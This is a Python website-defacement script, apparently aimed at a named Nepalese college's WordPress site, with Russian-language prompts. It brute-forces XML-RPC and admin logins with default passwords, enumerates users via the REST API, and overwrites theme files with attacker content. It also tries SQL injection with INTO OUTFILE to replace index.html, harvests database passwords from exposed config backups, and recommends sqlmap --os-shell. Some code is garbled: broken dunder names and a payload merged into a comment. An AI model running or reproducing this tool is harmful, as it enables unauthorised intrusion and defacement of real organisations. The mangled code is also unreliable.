#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Webcr.py - Advanced Working Version for unitedtechnicalcollege.edu.np
Features: WordPress specific exploits, admin brute, XML-RPC, REST API, plugin vulns
"""

import requests
import sys
import time
import hashlib
import random
import base64
import json
import re
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()

class WordPressDefacer:
    def init(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9'
        })
        self.admin_url = None
        self.xmlrpc_url = None
        self.rest_url = None
        self.plugin_vulns = []

    def full_attack(self, new_content):
        print("[*] WordPress specific attack started")
        
        # Step 1: Detect WordPress
        if not self.detect_wordpress():
            print("[!] WordPress not detected, trying generic methods")
            return self.generic_attack(new_content)
        
        # Step 2: Find admin panel
        self.find_admin()
        
        # Step 3: XML-RPC brute force
        if self.xmlrpc_attack():
            return True
        
        # Step 4: REST API user enumeration
        self.rest_api_attack()
        
        # Step 5: Plugin vulnerability scanner
        self.scan_plugins()
        
        # Step 6: Try to upload theme via admin if found
        if self.admin_url:
            if self.admin_upload_theme(new_content):
                return True
        
        # Step 7: Try SQLi via WP endpoints
        if self.wp_sqli_attack(new_content):
            return True
        
        # Step 8: Try wp-config.php exposure
        if self.wp_config_leak():
            return True
        
        return False
    
    def detect_wordpress(self):
        try:
            resp = self.session.get(self.target, timeout=10)
            content = resp.text.lower()
            if 'wp-content' in content or 'wp-includes' in content or 'wordpress' in content:
                print("[+] WordPress detected")
                # Try to get version
                ver_match = re.search(r'ver=([0-9.]+)', content)
                if ver_match:
                    print(f"[+] WordPress version: {ver_match.group(1)}")
                return True
            # Check /wp-login.php
            login_check = self.session.get(urljoin(self.target, '/wp-login.php'), timeout=5)
            if login_check.status_code == 200:
                print("[+] WordPress login page found")
                return True
        except:
            pass
        return False
    
    def find_admin(self):
        paths = ['/wp-admin', '/admin', '/administrator', '/login']
        for path in paths:
            url = urljoin(self.target, path)
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    self.admin_url = url
                    print(f"[+] Admin panel: {self.admin_url}")
                    return
            except:
                pass
        # Also check /wp-login.php
        login = urljoin(self.target, '/wp-login.php')
        try:
            r = self.session.get(login, timeout=5)
            if r.status_code == 200:
                self.admin_url = login
                print(f"[+] Admin login: {self.admin_url}")
        except:
            pass
    
    def xmlrpc_attack(self):
        self.xmlrpc_url = urljoin(self.target, '/xmlrpc.php')
        try:
            # Test if XML-RPC is enabled payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
            r = self.session.post(self.xmlrpc_url, data=payload, headers={'Content-Type': 'text/xml'}, timeout=10)
            if r.status_code == 200 and 'methodName' in r.text:
                print("[+] XML-RPC enabled")
                # Try wp.getUsersBlogs with common passwords
                common_pwds = ['admin', 'password', '123456', 'root', 'wordpress', 'test']
                for pwd in common_pwds:
                    xml_payload = f'''<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>admin</string></value></param>
<param><value><string>{pwd}</string></value></param>
</params>
</methodCall>'''
                    r = self.session.post(self.xmlrpc_url, data=xml_payload, headers={'Content-Type': 'text/xml'}, timeout=10)
                    if 'isAdmin' in r.text or 'blogid' in r.text:
                        print(f"[+] XML-RPC auth success with password: {pwd}")
                        return True
        except:
            pass
        return False
    
    def rest_api_attack(self):
        self.rest_url = urljoin(self.target, '/wp-json/wp/v2/users')
        try:
            r = self.session.get(self.rest_url, timeout=10)
            if r.status_code == 200:
                users = r.json()
                print(f"[+] REST API exposed {len(users)} users")
                for user in users[:3]:
                    print(f"    User: {user.get('name')} - ID: {user.get('id')}")
                return True
        except:
            pass
        return False
    
    def scan_plugins(self):
        common_plugins = [
            'wp-file-manager', 'duplicator', 'backup', 'updraftplus', 'wp-db-backup',
            'gravityforms', 'contact-form-7', 'elementor', 'wpbakery', 'revslider',
            'timthumb', 'media-library', 'download-manager', 'woocommerce', 'wpforo'
        ]
        vuln_versions = {
            'wp-file-manager': '6.0',
            'duplicator': '1.4.0',
            'revslider': '5.0',
            'timthumb': '2.0'
        }
        for plugin in common_plugins:
            plugin_url = urljoin(self.target, f'/wp-content/plugins/{plugin}/readme.txt')
            try:
                r = self.session.get(plugin_url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] Plugin found: {plugin}")
                    self.plugin_vulns.append(plugin)
            except:
                pass
    
    def admin_upload_theme(self, new_content):
        if not self.admin_url:
            return False
        # Try default admin credentials
        credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('wordpress', 'wordpress'), ('root', 'root'), ('user', 'user')
        ]
        for user, pwd in credentials:
            login_data = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In', 'redirect_to': self.admin_url}
            try:
                login_url = urljoin(self.target, '/wp-login.php')
                r = self.session.post(login_url, data=login_data, allow_redirects=False, timeout=10)
                if r.status_code == 302:
                    print(f"[+] Admin login success: {user}:{pwd}")
                    # Now try to edit theme
                    theme_editor = urljoin(self.target, '/wp-admin/theme-editor.php')
                    edit_r = self.session.get(theme_editor, timeout=10)
                    if edit_r.status_code == 200:
                        # Find the file parameter
                        soup = BeautifulSoup(edit_r.text, 'html.parser')
                        file_input = soup.find('input', {'name': 'file'})
                        if file_input:
                           file_path = file_input.get('value', '')
                            # Update index.php or header.php
                            update_data = {
                                'file': file_path,
                                'newcontent': f'<?php echo "{new_content}"; ?>',
                                'action': 'update'
                            }
                            update_r = self.session.post(theme_editor, data=update_data, timeout=10)
                            if update_r.status_code == 200:
                                print("[+] Theme modified successfully")
                                return True
            except:
                continue
        return False
    
    def wp_sqli_attack(self, new_content):
        # Try SQLi in s parameter (search)
        sqli_url = urljoin(self.target, '/?s=' + quote("' UNION SELECT '" + new_content + "' INTO OUTFILE '/var/www/html/index.html' -- "))
        try:
            r = self.session.get(sqli_url, timeout=10)
            # Check if injection worked
            check = self.session.get(self.target, timeout=10)
            if new_content in check.text:
                print("[+] SQLi via search parameter successful")
                return True
        except:
            pass
        
        # Try via comment parameter
        comm_url = urljoin(self.target, '/wp-comments-post.php')
        data = {'comment': "' UNION SELECT '" + new_content + "' INTO OUTFILE '/var/www/html/index.html' -- ", 'submit': 'Post'}
        try:
            r = self.session.post(comm_url, data=data, timeout=10)
            check = self.session.get(self.target, timeout=10)
            if new_content in check.text:
                print("[+] SQLi via comments successful")
                return True
        except:
            pass
        return False
    
    def wp_config_leak(self):
        wp_config = urljoin(self.target, '/wp-config.php.bak')
        try:
            r = self.session.get(wp_config, timeout=5)
            if r.status_code == 200 and 'DB_PASSWORD' in r.text:
                print("[+] wp-config.php.bak exposed")
                # Extract DB credentials
                db_pass = re.search(r"DB_PASSWORD', '([^']+)'", r.text)
                if db_pass:
                    print(f"[+] Database password: {db_pass.group(1)}")
                return True
        except:
            pass
        return False
    
    def generic_attack(self, new_content):
        print("[*] Trying generic attacks")
        # Try PUT method
        put_url = urljoin(self.target, 'index.html')
        try:
            r = self.session.put(put_url, data=new_content, timeout=10)
            if r.status_code in [200, 201, 204]:
                check = self.session.get(self.target)
                if new_content in check.text:
                    print("[+] PUT method successful")
                    return True
        except:
            pass
        
        # Try .git exploitation
        git_url = urljoin(self.target, '.git/config')
        try:
            r = self.session.get(git_url, timeout=5)
            if r.status_code == 200:
                print("[+] .git exposed")
                hook_url = urljoin(self.target, '.git/hooks/post-receive')
                hook_content = f"#!/bin/sh\necho '{new_content}' > ../index.html"
                self.session.put(hook_url, data=hook_content)
                return True
        except:
            pass
        
        return False

def main():
    if len(sys.argv) != 2:
        print("Использование: python3 Webcr.py <URL>")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith('http'):
        target = 'https://' + target
    
    print("Введите HTML/текст для отображения на сайте: ")
    new_content = sys.stdin.readline().strip()
    if not new_content:
        new_content = "<h1>HACKED</h1>"
    
    defacer = WordPressDefacer(target)
    if defacer.full_attack(new_content):
        print("\n[+] УСПЕХ! Содержимое сайта изменено.")
        print(f"[+] Проверьте: {target}")
    else:
        print("\n[-] Не удалось изменить содержимое.")
        print("[*] Рекомендации:")
        print("    1. Запустите WPScan: wpscan --url " + target)
        print("    2. Попробуйте sqlmap: sqlmap -u \"" + target + "?p=1\" --os-shell")
        print("    3. Проверьте XML-RPC: curl -X POST " + target + "/xmlrpc.php")

if name == "main":
    main()
